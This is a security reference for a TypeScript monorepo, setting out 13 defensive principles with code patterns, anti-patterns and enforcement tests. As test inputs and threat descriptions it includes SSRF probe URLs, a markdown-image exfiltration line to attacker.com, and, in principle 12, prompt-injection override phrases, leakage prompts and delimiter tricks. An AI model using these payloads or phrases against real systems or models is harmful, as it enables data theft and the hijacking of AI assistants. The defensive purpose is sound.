# Security — Defense in Depth for an Agent-Native Stack

> Status: Reference
> Last verified: April 2026
> Scope: All code in the monorepo. No file is exempt from the principles below. Implementation home: `packages/security/` (route guards, audit log, security headers, harden-check).

---

## What this file is

The security patterns for Gaia. These implement principle #9 of `code.md` ("security is opinionated, not optional") in concrete detail across 13 principles.

**This file is longer than the others. By design.** Security is the one domain where compression kills: every edge case left unstated becomes a potential attack vector. Each principle below names the specific attacks it defends against, so an agent adding code can check "does this principle still hold?" without guessing.

`packages/security/` is the runtime home for several of these (route wrappers, audit log, security headers, harden-check). The cross-cutting principles (input validation, secrets, supply chain) live in their owning package; this file is the index.

For audits / scoring / posture review, invoke `/a-security` — that skill walks the live codebase against this reference.

Read `code.md` first.

---

## Threat model

Gaia aligns to four reference frameworks:

1. **OWASP API Security Top 10 (2023/2025)** — BOLA, Broken Auth, BOPLA, Resource Consumption, Function Level Auth, Business Flow Abuse, SSRF, Misconfiguration, Inventory, Unsafe Consumption
2. **OWASP LLM Top 10 (2025, updated 2026)** — Prompt Injection (direct, indirect, multimodal, encoding evasion), Sensitive Info Disclosure, Supply Chain, Data Poisoning, Improper Output Handling, Excessive Agency, System Prompt Leakage, Vector/Embedding Weaknesses, Misinformation, Unbounded Consumption
3. **OWASP Top 10 (2025 web)** — Broken Access Control, Crypto Failures, Injection (including LLM), Insecure Design, Misconfiguration, Vulnerable Components, Auth Failures, Data Integrity, Logging Failures, SSRF
4. **OWASP ASVS** — verification standard used in `/w-review` checklists

These are the baseline. Gaia's principles below are the stack-specific implementation.

**Key architectural reality for 2026:** there is no silver bullet for prompt injection. Defense is layered, not patched. Every capability granted to an LLM is a potential vector.

---

## The 13 security patterns

Each principle below follows the same shape:

- **Headline + summary**
- **Attacks defended** (specific vectors, mapped to OWASP categories)
- **Pattern** (Gaia's implementation)
- **Anti-pattern** (common failure mode)
- **Enforcement** (how it's verified automatically)

---

### 1. Protected by default — `publicRoute` is the opt-out

Every route is authenticated unless wrapped in `publicRoute()` with an ADR justifying why. Agents should feel friction when making a route public — that's the point.

**Attacks defended:**

- Broken Function Level Authorization (OWASP API5)
- Forgotten auth middleware on newly-added routes
- Accidentally-public mutation endpoints (`POST /users/delete`)
- Middleware bypass class (cf. **Next.js CVE-2025-29927**: `x-middleware-subrequest` header skipped all middleware logic). Gaia's defense: auth check lives in the route-level guard (`packages/security/protected-route.ts`), not only in top-level middleware.

**Pattern:**

```ts
// apps/api/server/users/routes.ts
import { protectedRoute } from '@gaia/security/protected-route'
import { publicRoute } from '@gaia/security/public-route'

export const usersRoutes = new Elysia({ prefix: '/users' })
  .use(protectedRoute) // default
  .get('/me', ({ user }) => getUser(user.id))
  .post('/', ({ body, user }) => createUser(body, user.id))

// Explicit opt-out with ADR reference
export const authRoutes = new Elysia({ prefix: '/auth' })
  .use(publicRoute) // ADR-0023: login/signup must be unauthenticated
  .post('/login', ({ body }) => login(body))
```

`publicRoute` is a named wrapper — it doesn't just omit auth, it explicitly marks the route as public. Grep-friendly.

**Anti-pattern:**

```ts
// ❌ Auth only in top-level middleware
const app = new Elysia().use(authMiddleware).get('/admin', ...)

// ❌ No guard at all
.post('/users/delete', ({ body }) => deleteUser(body.id))
```

**Enforcement:**

- Oxlint rule — every `.post/.put/.patch/.delete(` call without `protectedRoute` or `publicRoute` fails lint.
- Security integration test — fires requests at every registered route without auth; every response that isn't from a `publicRoute`-marked route must be 401.
- `publicRoute` definition requires a JSDoc `@adr ADR-XXXX` tag.

---

### 2. Authorize per resource — check ownership, not just auth

Authentication ("you are logged in") is not authorization ("you own this row"). Every mutation and every sensitive read checks that the authenticated user owns or has permission to the specific resource.

**Attacks defended:**

- **BOLA / Broken Object Level Authorization (OWASP API1 — top API risk)**: `GET /api/invoices/42` returns invoice 42 regardless of who owns it.
- Horizontal privilege escalation — one user reads another user's data.
- ID enumeration attacks — predictable integer IDs let attackers scan for resources (Gaia uses UUIDs to raise the bar).
- Tenant leakage in multi-tenant contexts.

**Pattern:**

```ts
// packages/auth/ownership.ts (or per-feature service)
import { AppError } from '@gaia/errors'

export function requireOwnership<T extends { userId: string }>(resource: T | null, userId: string): T {
  if (!resource) throw new AppError('NOT_FOUND')           // uniform: don't reveal existence
  if (resource.userId !== userId) throw new AppError('NOT_FOUND') // same response as missing
  return resource
}

// Usage in a route
.get('/invoices/:id', async ({ params, user }) => {
  const invoice = await db.query.invoices.findFirst({
    where: and(eq(invoices.id, params.id), eq(invoices.userId, user.id)),
  })
  return requireOwnership(invoice, user.id)
})
```

Three layers of defense:

1. Query filters by ownership (`and(eq(id, ...), eq(userId, user.id))`).
2. `requireOwnership()` enforces it again at the response layer.
3. `NOT_FOUND` returned whether the resource is missing OR owned by someone else (no existence leak).

**Anti-pattern:**

```ts
// ❌ Trusts the URL param — any authenticated user can read any invoice
.get('/invoices/:id', async ({ params }) => db.query.invoices.findFirst({ where: eq(invoices.id, params.id) }))

// ❌ Distinguishes "not found" from "forbidden"
if (!invoice) throw new AppError('NOT_FOUND')
if (invoice.userId !== user.id) throw new AppError('FORBIDDEN') // leaks existence
```

**Enforcement:**

- ID schemas in TypeBox use UUID format only — mass enumeration becomes computationally infeasible.
- GritQL rule — `db.query.*.findFirst({ where: eq(X.id, ...) })` without a second `eq()` clause (tenant, userId, orgId) triggers `/w-review` flag.
- Security integration test — for every `GET/PUT/DELETE /resource/:id` route, create resource owned by user A, attempt access as user B, assert 404.

---

### 3. Validate every input at the boundary — trust the interior

All `body`, `query`, `params`, `headers` pass through TypeBox schemas at route entry. Interior code assumes values are valid.

**Attacks defended:**

- **SQL Injection** — Drizzle parameterizes `sql` templates, but `sql.raw()` is unsafe with user input.
- **Command Injection** — `Bun.spawn([cmd, userInput])` with unvalidated input.
- **Mass Assignment / BOPLA (OWASP API3)** — user sends `{ email, isAdmin: true }` and server blindly spreads it.
- **Type Confusion** — JSON field `id` expected as string but sent as `{ $gt: "" }` (NoSQL injection).
- **Oversized Payloads** — 10MB JSON body exhausts memory.
- **Malformed JSON / Unicode tricks** — homograph attacks, zero-width spaces in emails bypassing uniqueness checks.
- **Prompt Injection** (covered more in #12) — unvalidated strings passed directly to LLMs.

**Pattern:**

```ts
// apps/api/server/users/schema.ts
import { t } from 'elysia'
import { createInsertSchema } from 'drizzle-typebox'
import { users } from '@gaia/db/schema'

// Explicit allowlist — only fields a user can set
export const CreateUserBody = t
  .Pick(createInsertSchema(users), ['email', 'name'], { $id: 'users.create.body' })

  // Route validates before calling service
  .post('/users', ({ body, user }) => createUser(body, user.id), {
    body: CreateUserBody,
    response: { 201: UserSchemas['users.entity'], 409: ErrorResponseSchema },
  })
```

TypeBox rejects the request at the boundary. `createUser` trusts `body.email` is a valid email string.

**Anti-pattern:**

```ts
// ❌ Spread accepts any field — mass assignment
.post('/users', async ({ body, user }) => db.insert(users).values({ ...body, createdBy: user.id }))

// ❌ Raw SQL with concatenated input
const result = await db.execute(sql.raw(`SELECT * FROM users WHERE email = '${body.email}'`)) // SQL injection
```

**Enforcement:**

- Elysia routes without a `body:` schema on `POST/PUT/PATCH` fail lint.
- Oxlint rule bans `sql.raw()` outside migration files.
- Oxlint rule bans `Bun.spawn` with a variable as the first array element.
- Request body size limited to 1MB by default at the Elysia level; override requires ADR.

---

### 4. Rate limit by endpoint tier AND by business flow

Single-endpoint rate limiting catches brute force. Business-flow limiting catches attacks that spread across multiple endpoints (signup → email verify → password reset abuse).

**Attacks defended:**

- **Unrestricted Resource Consumption (OWASP API4)** — endpoints exhausted by volume.
- **Unrestricted Access to Sensitive Business Flows (OWASP API6)** — signup spam, trial abuse, checkout manipulation.
- **Credential Stuffing** — leaked email/password pairs tested at scale.
- **Account Enumeration** — repeated signups probing uniqueness.
- **Password Reset Spam** — attacker triggers password reset emails to a target email repeatedly.
- **Scraping** — list endpoints scraped repeatedly.
- **Brute force** — login, 2FA code, short-code guessing.

**Pattern (three tiers):**

```ts
// packages/security/rate-limits.ts
export const rateLimits = {
  // Tier 1: Endpoint-level (IP + user)
  public: { requests: 30, window: '1m' }, // unauthenticated
  protected: { requests: 120, window: '1m' }, // authenticated
  admin: { requests: 300, window: '1m' },

  // Tier 2: Business-flow level (spans multiple endpoints)
  signupFlow: {
    perIp: { requests: 5, window: '1h' },
    perEmail: { requests: 3, window: '24h' },
  },
  passwordResetFlow: {
    perIp: { requests: 5, window: '1h' },
    perEmail: { requests: 3, window: '24h' }, // critical: stops harassment
  },
  loginFlow: {
    perIp: { requests: 10, window: '10m' },
    perEmail: { requests: 5, window: '10m' }, // credential-stuffing defense
  },
  checkoutFlow: {
    perUser: { requests: 10, window: '1h' },
  },
}
```

Implemented via Dragonfly (Redis-compatible) keyed by `${flowName}:${ip|userId|email}`. Better Auth handles its own routes; Gaia's business-flow limits cover what spans multiple endpoints.

**Anti-pattern:**

```ts
// ❌ Rate limit on signup endpoint only
.post('/auth/signup', rateLimit({ requests: 5, window: '1h' }), signup)
.post('/auth/verify-email', verify)              // no limit — spam
.post('/auth/resend-verification', resend)       // no limit — email cost explodes
```

**Enforcement:**

- Security integration test — hit login endpoint 11 times, assert 11th returns 429.
- Security integration test — trigger 4 password resets for same email, assert 4th returns 429.
- Every new route in a known flow (signup, login, password reset, checkout) requires a corresponding flow-limit entry — flagged by `/w-review`.

---

### 5. Session hardening — cookies, rotation, short-lived tokens

Sessions are where most real-world breaches happen. Better Auth handles most of this; Gaia enforces the specific settings. See `packages/auth/CLAUDE.md` for the full Better Auth config.

**Attacks defended:**

- **XSS Session Theft** — `httpOnly: false` lets any JS read `document.cookie`.
- **Session Hijacking over HTTP** — `Secure: false` means cookies ride plaintext.
- **CSRF** — partially mitigated by `SameSite` (full defense in #6).
- **Session Fixation** — attacker sets a session ID, victim logs in, attacker reuses it (defense: rotate on login).
- **Token Replay** — long-lived tokens stolen from a device can be reused indefinitely.
- **Stolen Token Abuse** — no revocation on password change means old tokens remain valid.

**Key settings:**

| Setting                   | Value                 | Defends against                 |
| ------------------------- | --------------------- | ------------------------------- |
| `httpOnly`                | `true`                | XSS token theft                 |
| `Secure`                  | `true` (prod)         | MITM on non-HTTPS               |
| `SameSite`                | `'lax'`               | Cross-site POST CSRF            |
| `domain`                  | undefined (host-only) | Cross-subdomain token theft     |
| Session expiry            | 7 days                | Long-lived token abuse          |
| Password hash             | argon2id              | Hash cracking                   |
| Rotate on login           | yes                   | Session fixation                |
| Revoke on password change | yes                   | Stolen session after compromise |

**Anti-pattern:**

```ts
// ❌ Storing session in localStorage — readable by any JS
localStorage.setItem('session', token)

// ❌ Infinite sessions
expiresIn: 60 * 60 * 24 * 365 // a year

// ❌ SameSite=None without cross-origin requirement
sameSite: 'none'
```

**Enforcement:**

- Integration test — login, inspect `Set-Cookie` header, assert `HttpOnly`, `Secure` (prod), `SameSite=Lax`.
- Integration test — change password, assert old session token returns 401.
- Client-side code scanner: `localStorage.setItem(...token...|...auth...|...session...)` triggers lint error.

---

### 6. CSRF on every mutation — multi-layer defense

CSRF protection combines three layers in Gaia: Better Auth's built-in defense (Fetch Metadata + Origin checks), `SameSite=Lax` cookies, and `trustedOrigins` allowlist. All three active simultaneously.

**Attacks defended:**

- **Classic CSRF** — attacker hosts `<form action="https://gaia-app.com/delete-account" method="POST">` on a malicious site.
- **Login CSRF** — attacker forces victim's browser to log in as attacker.
- **Image-based GET CSRF** — `<img src="https://gaia-app.com/api/transfer?amount=1000">` (defended by using POST for mutations).
- **JSON CSRF** — attacker submits `application/json` via flash or form trick (defended by Content-Type + CORS).

**Pattern (stacked defenses):**

```ts
// packages/auth — Better Auth config
{
  trustedOrigins: [env.PUBLIC_APP_URL, ...env.ADDITIONAL_TRUSTED_ORIGINS],
  advanced: {
    disableCSRFCheck: false,    // never disable
    disableOriginCheck: false,
  },
}

// packages/security/csrf.ts (Elysia plugin for non-Better-Auth routes)
export const csrfMiddleware = new Elysia({ name: 'csrf' })
  .onBeforeHandle(({ request, set }) => {
    if (['GET', 'HEAD', 'OPTIONS'].includes(request.method)) return
    const origin = request.headers.get('origin') ?? request.headers.get('referer')
    if (!origin || !env.ALLOWED_ORIGINS.some((o) => origin.startsWith(o))) {
      set.status = 403
      throw new AppError('FORBIDDEN', { context: { origin } })
    }
  })
```

**Anti-pattern:**

```ts
// ❌ GET route that mutates state
.get('/api/subscribe', ({ user }) => subscribe(user.id))

// ❌ disableCSRFCheck for convenience
disableCSRFCheck: true

// ❌ Wildcard trustedOrigins
trustedOrigins: ['*']
```

**Enforcement:**

- Lint rule: `.get(...)` handlers may not call `db.insert/update/delete` or any adapter mutation.
- Integration test — POST request with `Origin: https://evil.com` returns 403 on every mutation route.
- Integration test — same-form POST succeeds when Origin matches `APP_URL`.

---

### 7. CORS: explicit allowlist, never wildcards

CORS is configured via a single policy. No per-route exceptions. `credentials: true` only with matching explicit origin allowlist.

**Attacks defended:**

- **Cross-Origin Data Theft** — lax CORS lets `evil.com` read authenticated API responses.
- **CSRF Amplification via CORS** — `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is a spec violation that some old browsers honored.
- **Sub-domain takeover → CORS allowlist bypass** — wildcard `*.yourdomain.com` plus an abandoned subdomain hands attacker CORS access.

**Pattern:**

```ts
// apps/api/server/middleware/cors.ts
import { cors } from '@elysiajs/cors'
import { env } from '@gaia/config'

export const corsMiddleware = cors({
  origin: env.ALLOWED_ORIGINS, // ['https://app.gaia.dev', 'https://admin.gaia.dev']
  credentials: true, // required for cookie auth
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 600, // cache preflight 10 minutes
})
```

Origins are literal strings, not patterns. No `*.domain.com` wildcards.

**Anti-pattern:**

```ts
// ❌ Wildcard / reflect / pattern / credentials with permissive origin
origin: '*'
origin: (origin) => origin ?? true
origin: /.*\.gaia\.dev$/
origin: '*', credentials: true
```

**Enforcement:**

- Oxlint rule — `cors({ origin: '*' })` or `origin: true` fails lint.
- Integration test — preflight from unlisted origin returns no `Access-Control-Allow-Origin` header.
- ALLOWED_ORIGINS has no wildcard patterns (runtime check on boot).

---

### 8. Security headers are mandatory defaults (strict CSP)

Every response sets a baseline of security headers. Gaia uses a **strict CSP with nonce + `strict-dynamic`** — the 2026 recommended approach. Allowlist CSPs are bypassable in ~25% of cases; strict CSP is not.

`packages/security/security-headers.ts` ships the baseline; expand to nonce-based CSP per the pattern below.

**Attacks defended:**

- **XSS (reflected, stored, DOM-based)** — strict CSP prevents attacker-injected scripts.
- **Clickjacking** — `X-Frame-Options: DENY` + `frame-ancestors 'none'`.
- **MIME Sniffing** — `X-Content-Type-Options: nosniff`.
- **Protocol Downgrade** — HSTS forces HTTPS, preloaded via browser lists.
- **Referrer Leakage** — `Referrer-Policy` prevents sensitive URLs in referer headers.
- **Permission Abuse** — `Permissions-Policy` denies camera/mic/geolocation by default.
- **Mixed Content** — `upgrade-insecure-requests` rewrites http→https.

**Pattern:**

```ts
// packages/security/security-headers.ts (target shape)
import { randomBytes } from 'node:crypto'
import { env } from '@gaia/config'

type ResponseSetLike = { headers: Record<string, string | number> }

export function applySecurityHeaders(set: ResponseSetLike, opts?: { cspNonce?: string }): void {
  const nonce = opts?.cspNonce ?? randomBytes(16).toString('base64')

  set.headers['content-security-policy'] = [
    `default-src 'self'`,
    `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'`,
    `style-src 'self' 'unsafe-inline'`,
    `img-src 'self' data: https:`,
    `font-src 'self' data:`,
    `connect-src 'self' ${env.PUBLIC_API_URL} https://*.sentry.io https://*.posthog.com`,
    `object-src 'none'`,
    `base-uri 'none'`,
    `frame-ancestors 'none'`,
    `form-action 'self'`,
    `upgrade-insecure-requests`,
  ].join('; ')

  set.headers['strict-transport-security'] = 'max-age=63072000; includeSubDomains; preload' // 2 years
  set.headers['x-frame-options'] = 'DENY'
  set.headers['x-content-type-options'] = 'nosniff'
  set.headers['referrer-policy'] = 'strict-origin-when-cross-origin'
  set.headers['permissions-policy'] = [
    'camera=()',
    'microphone=()',
    'geolocation=()',
    'payment=(self)',
    'fullscreen=(self)',
    'accelerometer=()',
    'gyroscope=()',
    'magnetometer=()',
    'usb=()',
    'bluetooth=()',
  ].join(', ')
  set.headers['cross-origin-opener-policy'] = 'same-origin'
  set.headers['cross-origin-resource-policy'] = 'same-site'
}
```

**Deployment process (from OWASP):**

1. Ship in `Content-Security-Policy-Report-Only` mode first.
2. Collect violation reports for 1–2 weeks.
3. Fix legitimate violations (refactor inline handlers, remove `eval`).
4. Switch to enforcement mode.

**Anti-pattern:**

```ts
// ❌ Allowlist CSP (bypassable)
;`script-src 'self' https://cdn.example.com`
// ❌ unsafe-inline without nonce fallback
`script-src 'self' 'unsafe-inline'`
```

**Enforcement:**

- Integration test — every response includes all required headers.
- CSP report endpoint (`POST /api/csp-report`) logs violations to Axiom.
- Client-side code with inline `on*=` event handlers fails lint (blocked by CSP anyway).
- `observatory.mozilla.org` scan on staging returns A+ grade as release gate.

---

### 9. Secrets discipline — never in code, logs, or client bundles

Secrets exit through many doors: git history, server logs, error responses, URL parameters, client bundles, analytics events. Gaia closes all of them.

**Attacks defended:**

- **Credential Theft via Log Access** — production logs contain API keys.
- **Client-Side Secret Exposure** — developer hardcodes API key in Solid component; ships to every browser.
- **Git History Leakage** — `.env` committed once and deleted — still in git history forever.
- **Error Response Leakage** — stack trace includes `DATABASE_URL=postgres://...` in production response body.
- **URL Parameter Leakage** — secret in query string appears in access logs and referrer headers.
- **Dependency Exfiltration** — compromised npm package reads `process.env`.

**Pattern:**

```ts
// packages/config/env.ts — single source of truth
import { Type } from '@sinclair/typebox'
import { Value } from '@sinclair/typebox/value'

const EnvSchema = Type.Object({
  // Server-side only (never exposed to client)
  BETTER_AUTH_SECRET: Type.String({ minLength: 32 }),
  DATABASE_URL: Type.String(),
  POLAR_API_KEY: Type.String(),
  RESEND_API_KEY: Type.String(),
  SENTRY_DSN: Type.String(),

  // Public (client-safe, prefixed)
  PUBLIC_APP_URL: Type.String(),
  PUBLIC_POSTHOG_KEY: Type.String(),

  NODE_ENV: Type.Union([
    Type.Literal('development'),
    Type.Literal('test'),
    Type.Literal('production'),
  ]),
})

export const env = Value.Parse(EnvSchema, process.env) // fail fast at boot
```

Client-side env split:

```ts
// apps/web/src/env.ts — only PUBLIC_ values
import { env as serverEnv } from '@gaia/config'

export const env = {
  APP_URL: serverEnv.PUBLIC_APP_URL,
  POSTHOG_KEY: serverEnv.PUBLIC_POSTHOG_KEY,
  // NO DATABASE_URL, NO BETTER_AUTH_SECRET, etc.
}
```

Build-time check: the Solid bundle is scanned for secret patterns before deploy.

Log redaction lives in `packages/core/redact.ts` (see `packages/core/CLAUDE.md` #3). Same redaction is applied in three places (logger, OTel span processor, Sentry `beforeSend`).

**Anti-pattern:**

```ts
// ❌ Hardcoded — example placeholder, NOT a real key
const POLAR_KEY = '<paste-your-secret-here>'

// ❌ Client-side
export const polarKey = import.meta.env.VITE_POLAR_SECRET // ships to browser

// ❌ Logged
log.info('polar request', { apiKey: env.POLAR_API_KEY, body })

// ❌ Secret in URL
await fetch(`/api/resource?api_key=${apiKey}`)
```

**Enforcement:**

- `gitleaks` pre-commit hook + CI job (blocks merge on match).
- Build step scans client bundle for suspected secret patterns (high-entropy strings, `sk_`, `rk_`, `polar_`) — fails deploy.
- Log aggregator (Axiom) receives redacted entries only (tested: inject known secret into request context, verify log entry is redacted).
- Integration test — request with `Authorization: Bearer test-secret-xyz`, trigger error, verify `test-secret-xyz` does not appear in Sentry event or Axiom log.

---

### 10. Audit log every mutation and every auth event

An append-only audit log records every security-relevant event. Without it, incident response is guesswork.

`packages/security/audit-log.ts` is the entry point; v1 stores into the `webhook_events` table tagged `provider='audit'`; v2 promotes to a dedicated `audit_log` table.

**Attacks defended:**

- **Insider Threats** — employee abuses admin access; no trail = no detection.
- **Delayed Incident Detection** — breach occurred but blast radius unknown.
- **Compliance Gaps** — SOC2, HIPAA, GDPR all require audit trails.
- **Inability to Reconstruct a Breach** — "what did the attacker access?" unanswerable.
- **Log Tampering** — append-only prevents evidence destruction.

**Pattern (target shape — v2):**

```ts
// packages/db/schema/audit.ts
export const auditLog = pgTable('audit_log', {
  id: uuid('id').primaryKey().defaultRandom(),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  // Who
  userId: uuid('user_id'), // null for unauthenticated events
  sessionId: uuid('session_id'),
  ip: text('ip'),
  userAgent: text('user_agent'),
  // What
  action: text('action').notNull(), // 'user.login', 'invoice.deleted'
  resourceType: text('resource_type'),
  resourceId: text('resource_id'),
  // State
  before: jsonb('before'),
  after: jsonb('after'),
  // Context
  requestId: text('request_id').notNull(), // from OTel trace ID
  metadata: jsonb('metadata'),
})
  .index('audit_user_time')
  .on(table.userId, table.createdAt)
  .index('audit_action_time')
  .on(table.action, table.createdAt)
```

**Append-only** enforced at the DB layer: dedicated Postgres role has `INSERT` only on `audit_log`. No `UPDATE` or `DELETE` privilege.

**Events to log** (minimum baseline):

| Event         | Example action                                   | Before/After       |
| ------------- | ------------------------------------------------ | ------------------ |
| Auth          | `auth.login`, `auth.login_failed`, `auth.logout` | N/A                |
| Auth          | `auth.password_changed`, `auth.email_changed`    | user state         |
| Auth          | `auth.session_revoked`, `auth.2fa_enabled`       | user state         |
| Users         | `user.created`, `user.deleted`                   | user state         |
| Billing       | `subscription.created/canceled/upgraded`         | subscription state |
| Admin         | `admin.user_impersonated`, `admin.user_deleted`  | context            |
| Access denied | `access.denied` (with reason)                    | what was attempted |

Service code adds before/after for sensitive mutations:

```ts
import { auditLog } from '@gaia/security/audit-log'

await auditLog({
  userId: user.id,
  action: 'user.password.changed',
  subject: user.id,
  before: { passwordHashUpdatedAt: oldDate },
  after: { passwordHashUpdatedAt: new Date() },
})
```

Querying audit log — admin-only route protected by `protectedRoute` + admin role check. Read-only; no delete endpoint exists.

**Anti-pattern:**

```ts
// ❌ Log to stdout only
console.log('user logged in', userId)

// ❌ Writable audit log
await db.update(auditLog).set(...)

// ❌ Missing attribution
await auditLog({ action: 'user.deleted' })
```

**Enforcement:**

- DB migration grants `INSERT` only on `audit_log` to app role; `UPDATE`/`DELETE` only on dedicated admin role.
- Every `POST/PUT/PATCH/DELETE` route triggers an audit log entry (integration-tested).
- Monthly audit-log review pipeline flags anomalies: many failed logins, off-hours admin actions.

---

### 11. SSRF defense — outbound URL fetches go through an allowlist

Any code that fetches a URL based on user input is a potential SSRF vector. All outbound fetches go through `safeFetch()` (lives in `packages/adapters/`) which validates the URL.

**Attacks defended:**

- **Server-Side Request Forgery (OWASP API7)** — attacker submits URL; server fetches; attacker gets internal data.
- **Cloud Metadata Credential Theft** — `http://169.254.169.254/latest/meta-data/` returns AWS IAM credentials.
- **Internal Network Scanning** — `http://10.0.0.1/admin` accessed via SSRF from a public endpoint.
- **Localhost Service Access** — `http://localhost:6379` hits unsecured Redis/Dragonfly.
- **DNS Rebinding** — attacker's domain resolves to valid IP during validation, then changes to internal IP for fetch.

**Pattern:**

```ts
// packages/adapters/http.ts
import { AppError } from '@gaia/errors'

const BLOCKED_HOSTS = new Set(['localhost', '127.0.0.1', '0.0.0.0', '::1'])
const BLOCKED_CIDRS = [
  '10.0.0.0/8',
  '172.16.0.0/12',
  '192.168.0.0/16',
  '169.254.0.0/16', // link-local + cloud metadata
  'fc00::/7', // IPv6 ULA
  'fe80::/10', // IPv6 link-local
]

export async function safeFetch(
  urlInput: string,
  opts: { allowedHosts?: string[]; maxSize?: number; timeout?: number } & RequestInit = {},
) {
  const url = new URL(urlInput)
  if (!['http:', 'https:'].includes(url.protocol))
    throw new AppError('FORBIDDEN', { context: { reason: 'protocol' } })
  if (opts.allowedHosts && !opts.allowedHosts.includes(url.hostname))
    throw new AppError('FORBIDDEN', { context: { reason: 'host' } })
  if (BLOCKED_HOSTS.has(url.hostname))
    throw new AppError('FORBIDDEN', { context: { reason: 'blocked_host' } })

  const addresses = await resolveAllAddresses(url.hostname)
  for (const addr of addresses) {
    if (BLOCKED_CIDRS.some((cidr) => inCidr(addr, cidr))) {
      throw new AppError('FORBIDDEN', { context: { reason: 'private_ip', addr } })
    }
  }

  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), opts.timeout ?? 10_000)
  try {
    const response = await fetch(url, { ...opts, signal: controller.signal })
    const size = Number(response.headers.get('content-length') ?? 0)
    if (size > (opts.maxSize ?? 10 * 1024 * 1024))
      throw new AppError('VALIDATION_ERROR', { context: { size } })
    return response
  } finally {
    clearTimeout(timer)
  }
}
```

**DNS rebinding** — validate the IP after DNS resolution, not just the hostname. Re-check on each retry.

**Anti-pattern:**

```ts
// ❌ Direct fetch with user input
.post('/api/preview', async ({ body }) => {
  const html = await fetch(body.url).then((r) => r.text())
  return extractPreview(html)
})

// ❌ Hostname-only check (DNS rebinding bypass)
if (url.hostname !== '169.254.169.254') fetch(url)
```

**Enforcement:**

- Oxlint rule — `fetch(...)` and `Bun.fetch(...)` forbidden outside `packages/adapters/` and `packages/testing/`.
- Security integration test — submit `http://169.254.169.254/`, `http://localhost/`, `http://10.0.0.1/`, `file:///etc/passwd`; assert all blocked.
- Security test for DNS rebinding — point test domain at private IP, verify `safeFetch` rejects.

---

### 12. LLM outputs are untrusted input — no silver bullet, many layers

Every token an LLM produces is treated as user-controlled input. The LLM's "output" is not a decision — it's a suggestion that must be validated, bounded, and often reviewed by a human before it affects state.

**This is the longest principle because prompt injection has no silver bullet.** Defense is layered. Each layer raises the cost of a successful attack.

**Attacks defended (partial list):**

- **Direct injection:** "Ignore all previous instructions"; DAN-style role-play.
- **Indirect injection (most dangerous):** prompts hidden in fetched web pages (white text, zero-width chars), uploaded docs (PDF, DOCX), email content, RAG corpus poisoning.
- **Multimodal injection:** instructions in image EXIF, steganographic text, audio transcription.
- **Encoding evasion:** base64, hex, URL encoding, **typoglycemia** (`"ignroe all prevoius instrcutions"`), zero-width joiners.
- **Delimiter injection:** fake `<|system|>` or `<|im_end|>` tokens.
- **System prompt leakage:** `"Repeat the text above"`.
- **Excessive Agency:** LLM has tool access it doesn't need.
- **Data Exfiltration via Output:** `![data](https://attacker.com/?leaked=secret)` — rendered as image, browser auto-loads.
- **Output Rendering as Stored XSS:** LLM output contains `<script>` rendered as HTML.
- **Lethal Trifecta** (Simon Willison's framing): private data + action capability + untrusted content = catastrophic when injection succeeds. Architectural rule: never combine all three without human-in-the-loop.

**Layer 1 — Treat LLM inputs as untrusted (`packages/adapters/ai.ts`):**

```ts
export async function generateText(opts: {
  systemPrompt: string
  userContent: string
  externalContent?: string
}) {
  const messages = [
    { role: 'system', content: opts.systemPrompt },
    {
      role: 'user',
      content: [
        opts.externalContent ? `<external_content>\n${sanitizeForLLM(opts.externalContent)}\n</external_content>` : '',
        `<user_query>\n${sanitizeForLLM(opts.userContent)}\n</user_query>`,
      ].filter(Boolean).join('\n\n'),
    },
  ]
  return await claude.messages.create({ messages, ... })
}

function sanitizeForLLM(content: string): string {
  return content
    .replace(/[​-‍﻿⁠-⁤]/g, '') // zero-width
    .replace(/<\|im_(start|end)\|>/g, '')                // delimiter injection
    .replace(/<\|system\|>/g, '')
    .slice(0, 50_000)                                    // length cap
}
```

**Layer 2 — Output validation against schema:** Always parse LLM output through TypeBox `Value.Check`; on failure, log + bail.

**Layer 3 — Human-in-the-loop for sensitive actions:** LLM never mutates state directly for destructive or irreversible actions. High-risk plans land in `approvalQueue` for admin review.

**Layer 4 — Per-tool sandboxing:** Each tool has `allowedInputs`, `maxCallsPerSession`, `requiresApproval`.

**Layer 5 — Output rendering is never trusted as HTML:** DOMPurify with allowlist; **no images, no links** by default to block markdown image exfiltration.

**Layer 6 — Output scanning for sensitive patterns:** regex sweep for Stripe-like keys, JWTs, private keys, credit-card-like numbers.

**Layer 7 — System prompt hardening:** explicit instructions about untrusted content; refusal patterns for "repeat the text above".

**Layer 8 — Monitoring:** every LLM call emits a PostHog event with input length, output length, sensitive-pattern matches, latency, tool calls. Anomalies trigger alerts.

**Anti-pattern:**

```ts
// ❌ LLM decides whether to delete
if (plan.shouldDelete) await db.delete(users).where(...)

// ❌ LLM output rendered as HTML
<div innerHTML={llmResponse} />

// ❌ Tool access without permission check
const tools = { sendEmail, deleteUser, chargeCard }

// ❌ System prompt + user input concatenated into one string
const prompt = `You are helpful. User: ${userInput}`
```

**Enforcement:**

- Lint rule — LLM responses cannot directly feed `db.update/.delete/.insert` without an approval intermediary.
- Lint rule — LLM output cannot be passed to `innerHTML` or `dangerouslySetInnerHTML`.
- Security test suite includes known prompt injection attempts; LLM responses verified not to leak system prompt or execute injected commands.
- Weekly review of LLM call anomalies in PostHog.
- CSP `img-src` in LLM chat views restricted to `'self' data:` only.

See `.claude/skills/a-ai/reference.md` for the full Anthropic SDK guidance.

---

### 13. Error responses don't leak internals; supply chain is continuously verified

Errors are the narrowest attack surface — they can leak stack traces, secrets, internal architecture. Supply chain is the widest — every transitive dependency is a potential compromise.

**Attacks defended:**

- **Information Disclosure via Verbose Errors** — production returns stack trace revealing `/var/www/api/db.ts:42 DATABASE_URL=postgres://...`.
- **Internal Architecture Leakage** — error reveals framework/library versions → CVE targeting.
- **Enumeration via Error Differences** — see #6 in `packages/errors/CLAUDE.md` (uniform auth errors).
- **Typosquatting** — `react-dom` vs. `reatc-dom`.
- **Dependency Confusion** — internal package name matches public name; manager fetches public (malicious) version.
- **Malicious Package Update** — legitimate package compromised (cf. axios backdoor incident, 3-hour propagation window).
- **Post-install Scripts** — `npm install` runs arbitrary code from any dependency.
- **Transitive Dependency CVEs** — your code is safe; a dep of a dep isn't.

